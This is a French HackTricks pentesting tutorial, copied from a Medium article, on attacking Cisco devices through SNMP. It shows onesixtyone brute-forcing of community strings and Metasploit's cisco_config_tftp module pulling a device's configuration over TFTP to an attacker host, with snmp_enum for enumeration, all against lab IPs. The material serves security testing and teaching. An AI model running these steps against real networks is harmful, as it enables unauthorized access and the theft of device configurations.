# Cisco SNMP

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de cybersécurité ? Voulez-vous voir votre entreprise annoncée dans HackTricks ? ou voulez-vous avoir accès à la dernière version de PEASS ou télécharger HackTricks en PDF ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Cette page a été copiée depuis [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

## Exfiltration de configuration et énumération via SNMP <a href="#e21c" id="e21c"></a>

**SNMP (Simple Network Management Protocol)** est un protocole qui vous permet de surveiller l'état des périphériques sur un réseau informatique. Il peut s'agir d'équipements réseau, de téléphones IP, de serveurs d'entreprise ou de tout autre élément.

**SNMP utilise le protocole de couche de transport UDP avec les numéros de port 161/UDP et 162/UDP.** Des chaînes de communauté sont utilisées pour faire référence aux agents SNMP sur le serveur. Ce sont, pour ainsi dire, des mots de passe spéciaux pour communiquer avec le serveur SNMP. **Les chaînes de communauté ont des autorisations soit en lecture seule (RO), soit en lecture-écriture (RW).**

**En fait, SNMP peut non seulement surveiller l'état de l'équipement, mais aussi le gérer entièrement : extraire des configurations, modifier la configuration, etc.** Si un testeur de pénétration peut rechercher la valeur des chaînes de communauté, il accède en fait à l'équipement. **Cependant, tout dépend de la chaîne qu'il a bruteforcée - la chaîne de communauté RO ou RW.**

**La force brute des chaînes de communauté peut être mise en œuvre à l'aide de l'utilitaire** [**onesixtyone**](https://github.com/trailofbits/onesixtyone). **Il prendra en entrée le dictionnaire pour la force brute et les adresses IP des hôtes cibles. Les cibles seront :**

* **10.10.100.10 - Commutateur Cisco vIOS**
* **10.10.100.254 - Routeur Cisco vIOS**
```
~$ onesixtyone -c communitystrings -i targets
```
Nous avons découvert quelles chaînes de communauté sont utilisées sur ces appareils. Cela ouvre la voie à l'exploitation.

### 8.1 cisco\_config\_tftp <a href="#1dbf" id="1dbf"></a>

Avec le framework Metasploit, notamment le module **cisco\_config\_tftp**, vous pouvez extraire la configuration de l'appareil en connaissant la valeur de la chaîne de communauté. La chaîne qui a les droits en lecture-écriture est **private**.

Nous aurons besoin des éléments suivants :

* **Chaîne de communauté en lecture-écriture (COMMUNITY)**
* **Adresse IP de l'attaquant (LHOST)**
* **Adresse IP de l'équipement cible (RHOSTS)**
* **Le chemin dans lequel le module sort la configuration de l'appareil (OUTPUTDIR)**
```bash
msf6 auxiliary(scanner/snmp/cisco_config_tftp) > set COMMUNITY private
msf6 auxiliary(scanner/snmp/cisco_config_tftp) > set RHOSTS 10.10.100.10
msf6 auxiliary(scanner/snmp/cisco_config_tftp) > set LHOST 10.10.100.50
msf6 auxiliary(scanner/snmp/cisco_config_tftp) > set OUTPUTDIR /home/necreas1ng/snmp
msf6 auxiliary(scanner/snmp/cisco_config_tftp) > exploit
```
Après avoir démarré le module, la configuration de l'hôte avec l'adresse 10.10.100.10 (10.10.100.10.txt) sera téléchargée dans le dossier spécifié.

![](<../../.gitbook/assets/image (223).png>)

### 8.2 snmp\_enum <a href="#3429" id="3429"></a>

Avec ce module, vous pouvez découvrir des informations sur le matériel cible. Tout est exactement pareil : spécifiez **COMMUNITY** (d'ailleurs, même une chaîne avec des **permissions RO** fera l'affaire) et l'adresse IP de l'appareil cible.
```bash
msf6 auxiliary(scanner/snmp/snmp_enum) > set COMMUNITY public
msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 10.10.100.10
msf6 auxiliary(scanner/snmp/snmp_enum) > exploit
```
<figure><img src="../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
